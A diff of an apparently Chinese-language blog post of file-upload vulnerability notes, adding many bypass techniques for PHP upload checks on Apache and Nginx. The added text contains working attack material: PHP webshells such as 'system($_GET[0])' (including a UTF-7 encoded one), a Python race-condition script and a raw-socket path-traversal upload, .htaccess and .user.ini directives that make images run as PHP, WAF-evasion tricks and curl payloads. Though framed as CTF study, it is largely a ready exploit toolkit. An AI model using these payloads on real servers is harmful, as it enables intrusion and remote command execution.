@@ -28,14 +28,12 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://zomnap.top/img/8.JPEG">
 <meta property="article:published_time" content="2026-04-08T11:48:55.000Z">
-<meta property="article:modified_time" content="2026-08-23T15:49:42.358Z">
+<meta property="article:modified_time" content="2026-11-16T08:18:25.200Z">
 <meta property="article:author" content="Zomnap">
 <meta property="article:tag" content="文件上传漏洞">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zomnap.top/img/8.JPEG">
   
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
   
   
   <title>记一次文件上传漏洞的学习及又一次提权练习 - Zomnap的博客</title>
@@ -291,7 +289,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          3.4k 字
         
       </span>
     
@@ -302,7 +300,7 @@
         
         
         
-          14 分钟
+          29 分钟
         
       </span>
     
@@ -310,9 +308,10 @@
     
     
       
-        <span id="busuanzi_container_page_pv" class="post-meta">
+        
+        <span class="post-meta" data-page-views-container>
           <i class="iconfont icon-eye" aria-hidden="true"></i>
-          本文阅读 <span id="busuanzi_value_page_pv">0</span> 次
+          本文阅读 <span data-page-views>—</span> 次
         </span>
 
       
@@ -356,7 +355,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年8月23日 晚上
+                    本文最后更新于 2026年11月16日 下午
                   
                 
               </p>
@@ -467,7 +466,71 @@
 <td>webp</td>
 <td>52 49 46 46</td>
 </tr>
+<tr>
+<td>PDF</td>
+<td>pdf</td>
+<td>25 50 44 46 (%PDF)</td>
+</tr>
+<tr>
+<td>7z</td>
+<td>7z</td>
+<td>37 7A BC AF 27 1C</td>
+</tr>
+<tr>
+<td>ELF</td>
+<td>so&#x2F;bin</td>
+<td>7F 45 4C 46</td>
+</tr>
+<tr>
+<td>SVG</td>
+<td>svg</td>
+<td>3C 73 76 67 (本质是 XML)</td>
+</tr>
 </tbody></table>
+<blockquote>
+<p>注：<strong>文件头只看前 N 个字节</strong>。<code>exif_imagetype()</code> 只读前 12 字节、<code>getimagesize()</code> 只读头部结构，都不校验图片完整性，所以「文件头 + PHP 代码」是通杀思路。<br>补一句：上面这些检测项，落到数据包里就是几个<strong>可以单独改</strong>的字段，先把「改哪里」记住，后面所有绕过都是围绕这几处做文章：</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="left">报文位置</th>
+<th align="left">能改什么</th>
+<th align="left">常见玩法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>filename=</code></td>
+<td align="left">后缀、大小写、点、空格、<code>%00</code>、<code>::$DATA</code>、<code>../</code></td>
+<td align="left">黑名单&#x2F;白名单绕过、路径穿越</td>
+</tr>
+<tr>
+<td align="left"><code>Content-Type:</code></td>
+<td align="left">任意 MIME</td>
+<td align="left">绕 MIME 检测</td>
+</tr>
+<tr>
+<td align="left"><code>name=</code></td>
+<td align="left">字段名（<code>file</code> &#x2F; <code>file[]</code>）</td>
+<td align="left">数组绕过、参数污染</td>
+</tr>
+<tr>
+<td align="left">引号写法</td>
+<td align="left"><code>filename=xx.php</code>（不加引号）、单引号</td>
+<td align="left">绕按 <code>filename=&quot;</code> 匹配的 WAF</td>
+</tr>
+<tr>
+<td align="left">字段顺序&#x2F;重复</td>
+<td align="left">同名 <code>file</code> 传两次</td>
+<td align="left">校验取第一个、落地取第二个</td>
+</tr>
+<tr>
+<td align="left"><code>boundary</code></td>
+<td align="left">任意字符串</td>
+<td align="left">与内容边界一致即可</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 命令行等价写法，改这三处就够了</span><br>curl -F <span class="hljs-string">&quot;file=@shell.php;filename=shell.php;type=image/png&quot;</span> http://t/upload.php<br></code></pre></td></tr></table></figure>
+
 <h3 id="后端检测扩展名-黑名单"><a href="#后端检测扩展名-黑名单" class="headerlink" title="后端检测扩展名(黑名单)"></a><strong>后端检测扩展名(黑名单)</strong></h3><ul>
 <li><strong>特殊解析后缀绕过</strong>尝试一些可平替的冷门格式 php平替: php3,php4,php5,phtml,pht,phps</li>
 <li><strong>大小写绕过</strong>将文件后缀大小写</li>
@@ -479,8 +542,66 @@
 
 <ul>
 <li><p><strong>.user.ini解析绕过</strong>apache中.user.ini文件可以配置同目录文件的部分设置(除PHP_INI_SYSTEM模式的配置以外都可以在.user.ini中进行重写) <strong>注:若没反应记得多刷新一下</strong>(经常这样), 该方法类似于[[文件包含]] (除了不能用伪协议, 相关绕过方法可参考)</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini">常用.user.ini设置<br><span class="hljs-attr">1. auto_append_file</span>=filename //一个相当于在每个php文件尾部加上 include(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><span class="hljs-attr">2. auto_prepend_file</span>=filename //一个相当于文件内容开始加上 include(<span class="hljs-string">&#x27;filename&#x27;</span>)<br>    filename实际为路径,可为绝对路径和相对路径<br>    上面两个则为利用文件包含漏洞执行代码<br>使用前提:服务器使用CGI/FastCGl模式,上传目录下要有可执行的php文件来执行include(&#x27;filename&#x27;)<br>    .user.ini只对他同一目录下的文件起作用<br></code></pre></td></tr></table></figure></li>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini">常用.user.ini设置<br><span class="hljs-attr">1. auto_append_file</span>=filename //一个相当于在每个php文件尾部加上 include(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><span class="hljs-attr">2. auto_prepend_file</span>=filename //一个相当于文件内容开始加上 include(<span class="hljs-string">&#x27;filename&#x27;</span>)<br>    filename实际为路径,可为绝对路径和相对路径<br>    上面两个则为利用文件包含漏洞执行代码<br>使用前提:服务器使用CGI/FastCGl模式,上传目录下要有可执行的php文件来执行include(&#x27;filename&#x27;)<br>    .user.ini只对他同一目录下的文件起作用<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>双写绕过</strong><code>str_replace(&#39;php&#39;,&#39;&#39;)</code> 只替换一次时有效：<code>shell.pphphp</code></p>
+</li>
+<li><p><strong>NTFS 数据流绕过</strong>Windows 下 <code>shell.php::$DATA</code>，落地仍是 <code>shell.php</code></p>
+</li>
+<li><p><strong>分号绕过</strong>IIS6：<code>shell.asp;.jpg</code>、<code>shell.asp/1.jpg</code></p>
+</li>
+<li><p><strong>超长截断</strong>超过文件系统限制（Linux 255 &#x2F; Windows 260）时后半段被丢掉：255 个 <code>a</code> + <code>.php</code></p>
+</li>
+<li><p><strong>多后缀</strong><code>shell.php.jpg</code>（Apache 从右往左解析，需配置）、<code>shell.jpg.php</code></p>
+</li>
+<li><p><strong>换行&#x2F;空字节</strong><code>shell.php%00.jpg</code>（PHP &lt; 5.3.4）、<code>shell.php%0a.jpg</code></p>
+</li>
 </ul>
+<p>黑名单代码最常见的四个写法缺陷，对着看就知道上面为什么能过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 缺陷1：没统一小写 → shell.PHP 过</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, [<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;php3&#x27;</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no&#x27;</span>);<br><br><span class="hljs-comment">// 缺陷2：只替换一次 → pphphp 过</span><br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span>);<br><br><span class="hljs-comment">// 缺陷3：只取第一个点之后 → shell.jpg.php 取到 jpg.php</span><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 缺陷4：explode 取 [1] → shell.jpg.php 取到 jpg 放行，落地仍被 Apache 解析</span><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>)[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure>
+
+<p>白名单比黑名单难，但口子就这几个：</p>
+<table>
+<thead>
+<tr>
+<th align="left">手法</th>
+<th align="left">payload</th>
+<th align="left">前提</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">空字节截断</td>
+<td align="left"><code>shell.php%00.jpg</code></td>
+<td align="left">PHP &lt; 5.3.4</td>
+</tr>
+<tr>
+<td align="left">超长截断</td>
+<td align="left">255 个字符 + <code>.php.jpg</code></td>
+<td align="left">校验在截断前</td>
+</tr>
+<tr>
+<td align="left">路径穿越</td>
+<td align="left"><code>filename=&quot;../../shell.php&quot;</code></td>
+<td align="left">服务端没 <code>basename()</code></td>
+</tr>
+<tr>
+<td align="left">二次渲染</td>
+<td align="left">图片马 + <code>.htaccess</code></td>
+<td align="left">需能传配置文件</td>
+</tr>
+<tr>
+<td align="left">条件竞争</td>
+<td align="left">先传后删，抢在 <code>unlink</code> 前访问</td>
+<td align="left">见下方脚本</td>
+</tr>
+</tbody></table>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 条件竞争：一边传一边狂访问</span><br><span class="hljs-keyword">import</span> threading, requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">up</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        requests.post(<span class="hljs-string">&quot;http://t/upload.php&quot;</span>,<br>                      files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;s.php&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;image/png&#x27;</span>)&#125;)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hit</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = requests.get(<span class="hljs-string">&quot;http://t/uploads/s.php?0=id&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;uid=&#x27;</span> <span class="hljs-keyword">in</span> r.text: <span class="hljs-built_in">print</span>(r.text); <span class="hljs-keyword">break</span><br>threading.Thread(target=up, daemon=<span class="hljs-literal">True</span>).start()<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>): threading.Thread(target=hit, daemon=<span class="hljs-literal">True</span>).start()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 路径穿越：filename 塞 ../（用 raw socket 才能发原始字节）</span><br><span class="hljs-keyword">import</span> socket<br>body = <span class="hljs-string">b&#x27;--b\r\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../shell.php&quot;\r\n\r\n&lt;?php system($_GET[0]);?&gt;\r\n--b--\r\n&#x27;</span><br>s = socket.create_connection((<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-number">80</span>))<br>s.sendall(<span class="hljs-string">b&#x27;POST /upload.php HTTP/1.1\r\nHost: target\r\nContent-Type: multipart/form-data; boundary=b\r\nContent-Length: %d\r\n\r\n&#x27;</span> % <span class="hljs-built_in">len</span>(body) + body)<br><span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">4096</span>))<br></code></pre></td></tr></table></figure>
+
+<p><code>.htaccess</code> 里除了 <code>AddType</code>，还有这些同一层的写法，挨个试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs htaccess"># 1) 让任意后缀按 PHP 解析（最常用）<br>AddType application/x-httpd-php .png .jpg .gif .txt .aaa<br><br># 2) handler 写法，优先级高于 AddType<br>AddHandler application/x-httpd-php .abc .xyz .shell<br><br># 3) 先删掉原有映射再加（.jpg 已被别处映射时用）<br>RemoveHandler .jpg<br>AddHandler application/x-httpd-php .jpg<br><br># 4) 整个目录全按 PHP 跑<br>SetHandler application/x-httpd-php<br><br># 5) 强制类型（不走扩展名）<br>ForceType application/x-httpd-php<br><br># 6) 包含型：让每个 php 执行前先 include 我们的文件<br>php_value auto_prepend_file &quot;shell.jpg&quot;<br>php_value auto_append_file  &quot;shell.jpg&quot;<br></code></pre></td></tr></table></figure>
+
 <h2 id="Apache服务器"><a href="#Apache服务器" class="headerlink" title="Apache服务器"></a>Apache服务器</h2><h3 id="有关-htaccess文件绕过"><a href="#有关-htaccess文件绕过" class="headerlink" title="有关.htaccess文件绕过"></a>有关.htaccess文件绕过</h3><p>首先要知道.htaccess文件的作用及系统配置文件，所以固有了一系列注入：<br>最常见的：</p>
 <h4 id="1-重写引擎“RewriteEngine”"><a href="#1-重写引擎“RewriteEngine”" class="headerlink" title="1.重写引擎“RewriteEngine”"></a>1.重写引擎“RewriteEngine”</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">Options +Indexes<br>DirectoryIndex /123.txt<br>Header set X-Flag &quot;expr=%&#123;file:/flag&#125;&quot;<br><br>---进阶版---<br><br>RewriteEngine On<br>RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;<br>RewriteRule .* - [E=FLAG_CONTENT:%1]<br>Header set X-Test-Expr &quot;%&#123;FLAG_CONTENT&#125;e&quot;<br></code></pre></td></tr></table></figure>
 
@@ -496,6 +617,126 @@
 
 <h4 id="6-Content-Type-操控（绕过MIME检查）"><a href="#6-Content-Type-操控（绕过MIME检查）" class="headerlink" title="6. Content-Type 操控（绕过MIME检查）"></a>6. <strong>Content-Type 操控（绕过MIME检查）</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 强制设置Content-Type，绕过前端校验</span><br><span class="hljs-attribute">ForceType</span> application/x-httpd-php<br><span class="hljs-comment"># 或</span><br><span class="hljs-attribute">DefaultType</span> application/x-httpd-php<br></code></pre></td></tr></table></figure>
 
+<h4 id="7-读文件：PHP-被禁也能把-flag-读出来"><a href="#7-读文件：PHP-被禁也能把-flag-读出来" class="headerlink" title="7. 读文件：PHP 被禁也能把 flag 读出来"></a>7. <strong>读文件：PHP 被禁也能把 flag 读出来</strong></h4><p>PHP 被 <code>engine off</code> 关掉、或者马被删了，还能靠 Apache 自己的表达式把文件读进响应头。</p>
+<p>方法一：一个文件搞定，靠 <code>Indexes</code> 让 Apache 去 stat 一个文件来触发表达式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">Options +Indexes<br>DirectoryIndex /test.txt<br>Header set X-Flag &quot;expr=%&#123;file:/flag&#125;&quot;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 访问目录本身，flag 就在响应头里</span><br>curl -I http://t/uploads/<br></code></pre></td></tr></table></figure>
+
+<p>方法二：PHP 彻底不通时，用 <code>mod_rewrite</code> 的 <code>expr</code> 读文件 → 环境变量 → 响应头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">RewriteEngine On<br>RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;<br>RewriteRule .* - [E=FLAG_CONTENT:%1]<br>Header set X-Flag-Expr &quot;%&#123;FLAG_CONTENT&#125;e&quot;<br></code></pre></td></tr></table></figure>
+
+<p>路径里带 <code>/</code> 被过滤时的 base64 版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">Header set X-Flag &quot;expr=%&#123;file:%&#123;unbase64:L2ZsYWc=&#125;&#125;&quot;   # L2ZsYWc= 是 /flag<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：<code>file()</code> 是 Apache 2.4 <code>expr</code> 内置函数；<code>expr=</code> 需要 mod_headers（Debian 默认带）。读大文件会被截断，读 <code>/flag</code> 这种刚好。</p>
+</blockquote>
+<h4 id="8-htaccess-自己也被-WAF-拦时怎么写回去"><a href="#8-htaccess-自己也被-WAF-拦时怎么写回去" class="headerlink" title="8. .htaccess 自己也被 WAF 拦时怎么写回去"></a>8. <strong>.htaccess 自己也被 WAF 拦时怎么写回去</strong></h4><table>
+<thead>
+<tr>
+<th align="left">拦截点</th>
+<th align="left">绕过写法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">关键词是完整单词（<code>php_value</code>、<code>auto_prepend_file</code>）</td>
+<td align="left">行尾 <code>\</code> 拆行，Apache 拼接时不插空格</td>
+</tr>
+<tr>
+<td align="left">服务端会在你内容后拼垃圾，导致整文件 500</td>
+<td align="left"><code>#\</code> 把后面的垃圾注释掉</td>
+</tr>
+<tr>
+<td align="left"><code>exif_imagetype()</code> 不让传 <code>.htaccess</code></td>
+<td align="left">首行写 <code>#define width 20</code>，伪装成 XBM 图片</td>
+</tr>
+<tr>
+<td align="left">首行必须像图片</td>
+<td align="left"><code>GIF89a</code> 开头，指令塞进 GIF 注释块</td>
+</tr>
+<tr>
+<td align="left">正则拦 <code>&lt;</code>、<code>?</code></td>
+<td align="left"><code>zend.multibyte</code> + UTF-7 编码源码</td>
+</tr>
+<tr>
+<td align="left">正则拦得太死</td>
+<td align="left"><code>pcre.backtrack_limit 0</code> + <code>pcre.jit 0</code> 让 <code>preg_match</code> 返回 false</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs htaccess"># 拆词 + 注释尾巴 + XBM 伪装，三合一<br>#define width 1337<br>#define height 1337<br>php_\<br>value auto_prepend_\<br>file &quot;php://filter/convert.base64-decode/resource=b64.txt&quot; #\<br>Just one chance<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs htaccess"># 完全不想写 &lt;?php 的时候：让 PHP 自己解 base64（b64.txt 里是 base64 的马）<br>php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=b64.txt&quot;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess"># 尖括号被拦时的编码流：文件里根本没有 &lt;（需 mbstring）<br>php_flag zend.multibyte 1<br>php_value zend.script_encoding &quot;UTF-7&quot;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">+ADw?php <span class="hljs-title function_ invoke__">system</span>(+ACQ-+AF8-GET+AFs-<span class="hljs-number">0</span>+AF0)+ADs ?+AD4-<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：<code>php_admin_value</code> &#x2F; <code>php_admin_flag</code> 写进 <code>.htaccess</code> 会 <strong>500</strong>（属于 <code>RSRC_CONF</code>，只能写在 server&#x2F;vhost 里）；<code>.user.ini</code> 在 <strong>mod_php 下完全不生效</strong>，只有 CGI&#x2F;FPM 认。这两条踩过就知道有多费时间。</p>
+</blockquote>
+<h4 id="9-生效判定与指令速查"><a href="#9-生效判定与指令速查" class="headerlink" title="9. 生效判定与指令速查"></a>9. <strong>生效判定与指令速查</strong></h4><p>下手前先做三步判定，不然容易白忙：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs htaccess"># ① AllowOverride 是否生效：放个不存在的指令，访问目录 500 就是生效<br>Bogus_Xyz On<br><br># ② 是不是 mod_php：能设 php_flag 就说明是<br>php_flag display_errors on<br><br># ③ 能不能解析：传个 a.txt 内容写 aa，访问看响应头<br>#    Content-Type: text/html; charset=UTF-8  → 已按 PHP 执行<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">指令</th>
+<th align="left">作用</th>
+<th align="left">前提</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>AddType</code> &#x2F; <code>AddHandler</code></td>
+<td align="left">指定后缀按 PHP 解析</td>
+<td align="left">mod_php</td>
+</tr>
+<tr>
+<td align="left"><code>RemoveHandler</code></td>
+<td align="left">清掉已有映射</td>
+<td align="left">FileInfo</td>
+</tr>
+<tr>
+<td align="left"><code>SetHandler</code></td>
+<td align="left">整目录强制 handler</td>
+<td align="left">FileInfo</td>
+</tr>
+<tr>
+<td align="left"><code>ForceType</code></td>
+<td align="left">强制 MIME</td>
+<td align="left">FileInfo</td>
+</tr>
+<tr>
+<td align="left"><code>php_value</code> &#x2F; <code>php_flag</code></td>
+<td align="left">改 PHP 配置（用户级）</td>
+<td align="left">mod_php</td>
+</tr>
+<tr>
+<td align="left"><code>Options +Indexes</code></td>
+<td align="left">列目录</td>
+<td align="left">Options</td>
+</tr>
+<tr>
+<td align="left"><code>Options +Includes</code></td>
+<td align="left">开 SSI，配合 <code>&lt;!--#exec cmd=&quot;id&quot;--&gt;</code></td>
+<td align="left">mod_include</td>
+</tr>
+<tr>
+<td align="left"><code>DirectoryIndex</code></td>
+<td align="left">改默认页</td>
+<td align="left">Indexes</td>
+</tr>
+<tr>
+<td align="left"><code>Header</code> &#x2F; <code>SetEnvIfExpr</code></td>
+<td align="left">改响应头、表达式</td>
+<td align="left">mod_headers</td>
+</tr>
+<tr>
+<td align="left"><code>RewriteEngine</code> &#x2F; <code>RewriteCond</code> &#x2F; <code>RewriteRule</code></td>
+<td align="left">重写、读文件、写环境变量</td>
+<td align="left">mod_rewrite</td>
+</tr>
+</tbody></table>
 <h2 id="Nginx服务器"><a href="#Nginx服务器" class="headerlink" title="Nginx服务器"></a>Nginx服务器</h2><p>主要还是靠.user.ini文件来控制</p>
 <p>针对Nginx服务器的文件上传利用与Apache的<code>.htaccess</code>有很大不同，因为<strong>Nginx不支持<code>.htaccess</code>文件</strong>。但Nginx有其他配置文件可以利用，我来详细讲解：</p>
 <hr>
@@ -529,6 +770,10 @@
 
 <h4 id="利用流程："><a href="#利用流程：" class="headerlink" title="利用流程："></a><strong>利用流程：</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 上传.user.ini</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;auto_prepend_file=shell.jpg&#x27;</span> &gt; .user.ini<br><br><span class="hljs-comment"># 2. 上传shell.jpg（同目录下）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php system($_GET[1]);?&gt;&#x27;</span> &gt; shell.jpg<br><br><span class="hljs-comment"># 3. 访问同目录下任意PHP文件触发</span><br>curl http://target.com/upload/index.php?1=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
 
+<blockquote>
+<p>注：<code>.user.ini</code> 有缓存，<code>user_ini.cache_ttl</code> 默认 300 秒，传完没反应先等一会儿或者多刷几次；另外它是<strong>按目录</strong>生效的，只影响和它同级的脚本，上级目录的 php 不会被污染。</p>
+</blockquote>
+<p>补充两个常用变体：<code>auto_append_file</code> 效果一样，只是插在脚本末尾（适合覆盖输出）；用相对路径时以<strong>脚本所在目录</strong>为准，所以 <code>auto_prepend_file=shell.jpg</code> 和 <code>auto_prepend_file=/tmp/shell.jpg</code> 要分清。</p>
 <hr>
 <h4 id="2-Nginx配置注入（nginx-conf覆盖-包含）"><a href="#2-Nginx配置注入（nginx-conf覆盖-包含）" class="headerlink" title="2. Nginx配置注入（nginx.conf覆盖&#x2F;包含）"></a>2. <strong>Nginx配置注入（nginx.conf覆盖&#x2F;包含）</strong></h4><p>如果上传目录恰好是Nginx配置根目录，且存在包含漏洞：</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 恶意nginx.conf片段</span><br><span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>    <span class="hljs-attribute">root</span> /var/www/html/upload;<br>    <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">127.0.0.1:9000</span>;<br>    <span class="hljs-attribute">fastcgi_index</span> index.php;<br>    <span class="hljs-comment"># 危险配置：将.jpg解析为PHP</span><br>    <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;<br>    <span class="hljs-attribute">include</span> fastcgi_params;<br>&#125;<br><br><span class="hljs-comment"># 更隐蔽的：利用map指令注入</span><br><span class="hljs-attribute">map</span> <span class="hljs-variable">$http_x_attack</span> <span class="hljs-variable">$exec</span> &#123;<br>    <span class="hljs-attribute">default</span> <span class="hljs-number">0</span>;<br>    &quot;shell&quot; 1;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -549,6 +794,9 @@
 <p><strong>或利用空字节（旧版本）：</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://target.com/upload/shell.jpg%00.php<br></code></pre></td></tr></table></figure>
 
+<p>前提是 <code>cgi.fix_pathinfo=1</code>（PHP 默认就是 1）且 location 用的是 <code>\.php$</code> 正则；只写了 <code>fastcgi_split_path_info</code> 而没校验 <code>$fastcgi_path_info</code> 是否以 <code>.php</code> 结尾，才会让 <code>shell.jpg/.php</code> 走进 PHP-FPM。更多变体：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://t/upload/shell.jpg/x.php      <span class="hljs-comment"># 路径信息</span><br>curl http://t/upload/shell.jpg%20.php     <span class="hljs-comment"># 空格绕过</span><br>curl http://t/upload/shell.jpg;.php       <span class="hljs-comment"># Tomcat 系也吃这套</span><br></code></pre></td></tr></table></figure>
+
 <hr>
 <h4 id="5-Nginx-Header-注入（CRLF-Injection）"><a href="#5-Nginx-Header-注入（CRLF-Injection）" class="headerlink" title="5. Nginx Header 注入（CRLF Injection）"></a>5. <strong>Nginx Header 注入（CRLF Injection）</strong></h4><p>如果Nginx配置存在CRLF注入，可注入恶意Header：</p>
